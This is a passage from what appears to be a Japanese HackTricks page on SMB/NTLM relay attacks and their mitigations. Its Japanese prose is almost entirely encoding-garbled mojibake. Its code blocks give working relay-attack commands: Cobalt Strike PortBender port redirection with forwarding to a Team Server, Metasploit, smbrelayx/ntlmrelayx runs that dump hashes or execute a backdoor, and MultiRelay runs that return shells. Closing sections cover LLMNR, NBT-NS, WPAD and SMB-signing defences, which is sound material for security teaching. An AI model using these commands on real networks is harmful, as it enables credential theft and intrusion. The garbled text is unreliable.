ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã«ãƒã‚·ãƒ³ã‚’**å°å…¥ã§ãã‚‹**å ´åˆã¯ã€æ¬¡ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã®**ãƒ„ãƒ¼ãƒ«**ã‚’ä½¿ç”¨ã—ã¦ãƒªãƒ¬ãƒ¼æ”»æ’ƒã‚’å®Ÿè¡Œã§ãã€ã“ã‚Œã«ã¤ã„ã¦å¿ƒé…ã™ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚
{% endhint %}

ã—ã‹ã—ã€ãƒ¬ãƒƒãƒ‰ãƒãƒ¼ãƒ ã§ã¯ãã†ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ãƒ¬ãƒƒãƒ‰ãƒãƒ¼ãƒ ã§ã¯é€šå¸¸ã€ä»¥ä¸‹ã®ãƒ„ãƒ¼ãƒ«ã®ã„ãšã‚Œã‹ã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹ãƒã‚·ãƒ³ã«Windowsãƒã‚·ãƒ³ã®ãƒãƒ¼ãƒˆ445ã®ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’**è»¢é€ã—**ã€ãã®ãƒ„ãƒ¼ãƒ«ã®ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’ãƒ—ãƒ­ã‚­ã‚·ã‚’é€šã˜ã¦å†…éƒ¨ã®æ”»æ’ƒå¯¾è±¡ãƒã‚·ãƒ³ã«**ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚

ãƒ„ãƒ¼ãƒ«[**PortBender**](https://github.com/praetorian-inc/PortBender)ã¯ã€ãƒãƒ¼ãƒˆ**445ã®ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’åˆ¥ã®ãƒãƒ¼ãƒˆ**ï¼ˆä¾‹ï¼š8445ï¼‰ã«**ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆ**ã™ã‚‹ãƒ‰ãƒ©ã‚¤ãƒãƒ¼ã§ã™ã€‚ãƒ‰ãƒ©ã‚¤ãƒãƒ¼ã‚’ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ãŸã‚ã«ã¯**ãƒ­ãƒ¼ã‚«ãƒ«ç®¡ç†è€…**ã‚¢ã‚¯ã‚»ã‚¹ãŒå¿…è¦ã§ã™ã€‚ã»ã¨ã‚“ã©ã®Windowsãƒ‰ãƒ©ã‚¤ãƒãƒ¼ãŒé…ç½®ã•ã‚Œã¦ã„ã‚‹`C:\Windows\System32\drivers`ã«ç§»å‹•ã™ã‚‹ã®ãŒç†ã«ã‹ãªã£ã¦ã„ã¾ã™ã€‚
```bash
Cobalt Strike -> Script Manager -> Load (Select from the filesystem PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Go to drivers dir
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Forward traffic to 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Send traffic to port 8445 to Team Server
beacon> socks 1080 # Socks proxy in port 1080 to attack host in the internal network from the Team Server

# To kill
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Metasploit
```bash
setg Proxies socks4:127.0.0.1:1080 # Use this if you need to route the traffic to reach the attacked ip
set SRVHOST <local_ip>
set SRVPORT 445
set SMBHOST <ip_to_auth_to>
run -j
```
### smbrelayx
```bash
python3 smbrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
# By default it will just dump hashes
# To execute a command use: -c "ipconfig"
# To execute a backdoor use: -e "/path/to/backdoor

# Attack through socks proxy
proxychains python3 ntlmrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
```
### MultiRelay

**MultiRelay**ã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã€_**/usr/share/responder/tools**_ ã«ç§»å‹•ã—ã€MultiRelayã‚’å®Ÿè¡Œã—ã¾ã™ï¼ˆ`-t <IP target> -u <User>`ï¼‰ï¼š
```bash
python MultiRelay.py -t <IP target> -u ALL # If "ALL" then all users are relayed
# By default a shell is returned
python MultiRelay.py -t <IP target> -u ALL -c whoami #-c to execute command
python MultiRelay.py -t <IP target> -u ALL -d #-d to dump hashes

# Use proxychains if you need to route the traffic to reach the attacked ip
```
### NTLMãƒ­ã‚°ã‚¤ãƒ³ã®å¼·åˆ¶

Windowsã§ã¯ã€**ç‰¹æ¨©ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä»»æ„ã®ãƒã‚·ãƒ³ã«èªè¨¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹å ´åˆãŒã‚ã‚Šã¾ã™**ã€‚ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã‚’èª­ã‚“ã§ã€æ–¹æ³•ã‚’å­¦ã³ã¾ã—ã‚‡ã†ï¼š

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## è§£æ±ºç­–

### LLMNRã®ç„¡åŠ¹åŒ–

ãƒ‰ãƒ¡ã‚¤ãƒ³å†…ã®DNSã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã§LLMNRã‚’ç„¡åŠ¹ã«ã™ã‚‹ã«ã¯ã€gpedit.mscã‚’é–‹ãã¾ã™ã€‚\
ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã®æ§‹æˆ->ç®¡ç†ç”¨ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ->ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯->DNSã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«ç§»å‹•ã—ã¾ã™ã€‚\
ã€Œãƒãƒ«ãƒã‚­ãƒ£ã‚¹ãƒˆåå‰è§£æ±ºã‚’ã‚ªãƒ•ã«ã™ã‚‹ã€ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’æ¢ã—ã€ã€Œãƒãƒªã‚·ãƒ¼è¨­å®šã€ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ï¼š

![](../../.gitbook/assets/1.jpg)

æ–°ã—ã„ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ãŒé–‹ã„ãŸã‚‰ã€ã“ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’æœ‰åŠ¹ã«ã—ã€ã€Œé©ç”¨ã€ã‚’æŠ¼ã—ã¦ã‹ã‚‰ã€ŒOKã€ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ï¼š

![](../../.gitbook/assets/2.jpg)

### **NBT-NSã®ç„¡åŠ¹åŒ–**

NBT-NSã‚’ç„¡åŠ¹ã«ã™ã‚‹ä¸€ã¤ã®æ–¹æ³•ã¯ã€DHCPã‚¹ã‚³ãƒ¼ãƒ—ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚

Microsoftã®DHCPã‚µãƒ¼ãƒãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€NBT-NSã‚’ç„¡åŠ¹ã«ã—ãŸã„ã‚¹ã‚³ãƒ¼ãƒ—ã‚’é¸æŠã—ã¾ã™ã€‚å³ã‚¯ãƒªãƒƒã‚¯ã—ã¦ã€Œã‚¹ã‚³ãƒ¼ãƒ—ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã€ã‚’é¸ã³ã€ã€Œã‚ªãƒ—ã‚·ãƒ§ãƒ³ã®è¨­å®šã€ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ã€‚ä»¥ä¸‹ã®ä¾‹ã§ã¯ã€NBT-NSã‚’ç„¡åŠ¹ã«ã—ãŸã„DHCPã‚¹ã‚³ãƒ¼ãƒ—ã¯192.168.1.100ã§ã™ã€‚

![](../../.gitbook/assets/3.jpg)

ã‚¹ã‚³ãƒ¼ãƒ—ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã§ã€è©³ç´°ã‚¿ãƒ–ã«ç§»å‹•ã—ã€ãƒ‰ãƒ­ãƒƒãƒ—ãƒ€ã‚¦ãƒ³ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚’ã€ŒMicrosoft Windows 2000ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã€ã«å¤‰æ›´ã—ã¾ã™ï¼š

![](../../.gitbook/assets/4.jpg)

ãƒªã‚¹ãƒˆã‹ã‚‰ã€Œ001 Microsoft Disable Netbios Optionã€ã‚’é¸æŠã—ã€ãã®å€¤ã‚’ã€Œ0x2ã€ã«å¤‰æ›´ã—ã€ã€Œé©ç”¨ã€ã‚’æŠ¼ã—ã¦ã‹ã‚‰ã€ŒOKã€ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¾ã™ï¼š

![](../../.gitbook/assets/5.jpg)

### WPAD

WPADæ”»æ’ƒã«å¯¾å‡¦ã™ã‚‹ã«ã¯ã€DNSã‚¾ãƒ¼ãƒ³ã«ã€Œwpadã€ã¨ã„ã†ã‚¨ãƒ³ãƒˆãƒªã‚’è¿½åŠ ã—ã¾ã™ã€‚DNSã‚¨ãƒ³ãƒˆãƒªã¯æœ‰åŠ¹ãªWPADã‚µãƒ¼ãƒãƒ¼ã‚’æŒ‡ã—ã¦ã„ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã‚¯ã‚¨ãƒªãŒè§£æ±ºã•ã‚Œã‚Œã°ã€æ”»æ’ƒã¯é˜²ã’ã¾ã™ã€‚

### ãƒãƒ«ãƒãƒªãƒ¬ãƒ¼

1\. **ã™ã¹ã¦ã®ãƒ­ãƒ¼ã‚«ãƒ«Windowsãƒã‚·ãƒ³ã§SMBç½²åã‚’å¼·åˆ¶ã™ã‚‹**ã€‚ã“ã®è¨­å®šã¯ã€ã™ã¹ã¦ã®SMBã‚»ãƒƒã‚·ãƒ§ãƒ³ã«ãƒ‡ã‚¸ã‚¿ãƒ«ç½²åã‚’æ–½ã—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¨ã‚µãƒ¼ãƒãƒ¼ãŒãƒ‘ã‚±ãƒƒãƒˆã®å‡ºæ‰€ã‚’ç¢ºèªã—ã¦ã‹ã‚‰ç¶šè¡Œã™ã‚‹ã“ã¨ã‚’å¼·åˆ¶ã—ã¾ã™ã€‚ã“ã®è¨­å®šã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ã«ã®ã¿æœ‰åŠ¹ã§ã™ã€‚ä»¥ä¸‹ã®Microsoftã®è¨˜äº‹ã«ã¯ã€ã“ã‚Œã‚‰ã®è¨­å®šï¼ˆã‚°ãƒ«ãƒ¼ãƒ—ãƒãƒªã‚·ãƒ¼ã‚’é€šã˜ã¦æœ‰åŠ¹ã«ã§ãã‚‹ï¼‰ã¨ã€ãã‚Œã‚‰ã‚’å®Ÿè£…ã™ã‚‹æ–¹æ³•ãŒè©³ã—ãè¨˜è¼‰ã•ã‚Œã¦ã„ã¾ã™ã€‚

[https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/](https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/)

[https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always)

2\. **ãƒ­ãƒ¼ã‚«ãƒ«ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå¿…è¦ãªãƒã‚·ãƒ³ã«ã®ã¿ãƒªãƒ¢ãƒ¼ãƒˆãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹ã‚ˆã†ã«ç¢ºèªã™ã‚‹**ã€‚ä¾‹ãˆã°ã€Sallyã¯Sallyã®ãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã«ã®ã¿ãƒ­ã‚°ã‚¤ãƒ³ã§ãã¾ã™ã€‚æ”»æ’ƒè€…ãŒSallyã®SMBèªè¨¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’å‚å—ã—ãŸå ´åˆã§ã‚‚ã€ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä»–ã®ãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã«ãƒªãƒ¬ãƒ¼ã™ã‚‹ã“ã¨ã¯ã§ããªã„ãŸã‚ã€ã“ã®æ–¹æ³•ã¯ç„¡åŠ¹ã«ãªã‚Šã¾ã™ã€‚

3\. **å¯èƒ½ãªé™ã‚Šãƒ­ãƒ¼ã‚«ãƒ«ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã§ã®NTLMèªè¨¼ã‚’åˆ¶é™ã™ã‚‹**ã€‚ã“ã®æ”»æ’ƒã¯Kerberosèªè¨¼ã‚’åˆ©ç”¨ã§ããªã„ãŸã‚ã€ç™ºç”Ÿã™ã‚‹NTLMã®é‡ã‚’åˆ¶é™ã™ã‚‹ã“ã¨ã§ã€ã“ã®æ”»æ’ƒã‚’å¤§å¹…ã«é˜»æ­¢ã§ãã¾ã™ã€‚Microsoftã‹ã‚‰ã“ã®å®Ÿç¾æ–¹æ³•ã«é–¢ã™ã‚‹æƒ…å ±ãŒã‚ã‚Šã¾ã™ãŒã€æ³¨æ„ãŒå¿…è¦ã§ã™ã€‚Kerberosèªè¨¼ãŒä½•ã‚‰ã‹ã®ç†ç”±ã§å¤±æ•—ã™ã‚‹ã¨ã€é€šå¸¸ã¯NTLMã«ãƒ•ã‚©ãƒ¼ãƒ«ãƒãƒƒã‚¯ã—ã¾ã™ã€‚å®Œå…¨ã«ç„¡åŠ¹ã«ã™ã‚‹ã¨ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãŒåœæ­¢ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

4\. **ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ä¸æ­£ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’é˜²ã**ã€‚å†…éƒ¨ã®è„…å¨ã¯ã€ã™ã§ã«ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯è³‡æ ¼æƒ…å ±ã‚’æŒã£ã¦ã„ã‚‹ãŸã‚ã€SMBãƒªãƒ¬ãƒ¼æ”»æ’ƒã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ç‰©ç†ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒªã‚·ãƒ¼ã‚’å¼·åŒ–ã—ã€ACLã‚„MACãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã§ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ä¸æ­£ãªãƒ‡ãƒã‚¤ã‚¹ã‚’é˜²ãã€é©åˆ‡ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚»ã‚°ãƒ¡ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ç¢ºä¿ã™ã‚‹ã“ã¨ã§ã€ã“ã®æ”»æ’ƒãŒå®Ÿè¡Œã•ã‚Œã‚‹è„…å¨ã‚’å¤§å¹…ã«åˆ¶é™ã§ãã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [**https://intrinium.com/smb-relay-attack-tutorial/**](https://intrinium.com/smb-relay-attack-tutorial/)
* **ç”»åƒå‡ºå…¸ï¼š**\
[https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)\
[https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)\
[https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)\
[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ã”è¦§ãã ã•ã„ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã«åºƒå‘Šã‚’æ²è¼‰ã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã™ã‚‹ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³**](https://opensea.io/collection/the-peass-family)
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã§**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* **HackTricks**ã®[**GitHubãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks)ã‚„[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
